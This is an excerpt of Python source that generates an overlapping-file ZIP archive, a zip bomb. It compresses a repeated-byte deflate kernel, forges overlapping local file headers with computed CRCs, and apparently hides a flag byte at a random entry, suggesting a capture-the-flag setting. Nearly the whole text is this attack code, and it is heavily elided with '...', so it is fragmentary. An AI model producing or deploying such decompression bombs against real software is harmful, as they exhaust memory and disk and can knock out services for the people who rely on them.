...
def bulk_deflate(repeated_byte, compressed_size=None, max_uncompressed_size=None, final=1):
    ...
    if(final):
        ...
        bits.push(0b0, final and 1 or 1)
...
def append_deflate_block(block_1, block_2):
    bits = BitBuffer()
    for i in block_1[:-1]:
        bits.push(i, 8)
    bits.push(block_1[-1], block_1[-1].bit_length())
    for i in block_2[:-1]:
        bits.push(i, 8)
    bits.push(block_2[-1], block_2[-1].bit_length())
    return bits.bytes()

def get_random_string(n=100):
    letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
    result_str = bytes(''.join(random.choice(letters) for i in range(100)).encode())
    return result_str


def write_zip_quoted_overlap(f, num_files, compressed_size=None, max_uncompressed_size=None, compression_method=COMPRESSION_METHOD_DEFLATE, zip64=False, template=[], extra_tag=None, max_quoted=0, flag=0x41):
    class FileRecord:
        def __init__(self, header, data, crc_matrix=0):
            self.header = header
            self.data = data
            self.crc_matrix = crc_matrix

    # Compress the kernel.
    kernel, kernel_uncompressed_size, kernel_crc_matrix = BULK_COMPRESS[compression_method](CHOSEN_BYTE, compressed_size=compressed_size, max_uncompressed_size=max_uncompressed_size, final=0)
    flag_letter, flag_letter_size, flag_letter_crc_matrix = BULK_COMPRESS[compression_method](flag, compressed_size=None, max_uncompressed_size=517, final=1)
    kernel = append_deflate_block(kernel, flag_letter)
    print(kernel)
    kernel_uncompressed_size += flag_letter_size

    crc_matrix = precompute_crc_matrix_repeated(b"\x00", kernel_uncompressed_size)

    temp_crc_matrix = precompute_crc_matrix_repeated(b"\x00", flag_letter_size)
    combined_crc = crc_combine(crc_matrix_apply(kernel_crc_matrix), crc_matrix_apply(flag_letter_crc_matrix), temp_crc_matrix)

    header = LocalFileHeader(len(kernel) - len(flag_letter), kernel_uncompressed_size, combined_crc, get_random_string(), compression_method=compression_method)
    ...
    index_for_flag = random.randint(1, num_files-1)
    done = 0

    while compression_method == COMPRESSION_METHOD_DEFLATE and len(files) < num_files:
        ...
        if(len(files) == index_for_flag):
            header = LocalFileHeader(
                len(quote) + num_quoted + next_file.header.compressed_size + len(flag_letter),
            ...
            header = LocalFileHeader(
                ...
                num_quoted + next_file.header.uncompressed_size - len(flag_letter)*done,
                new_crc,
                get_random_string(),
                compression_method=compression_method,
            )
...
def main():
    ...
    mode(open("test.zip", "wb"), num_files, compressed_size=compressed_size, max_uncompressed_size=max_uncompressed_size, compression_method=compression_method, zip64=zip64, template=template, extra_tag=extra_tag, max_quoted=max_quoted)
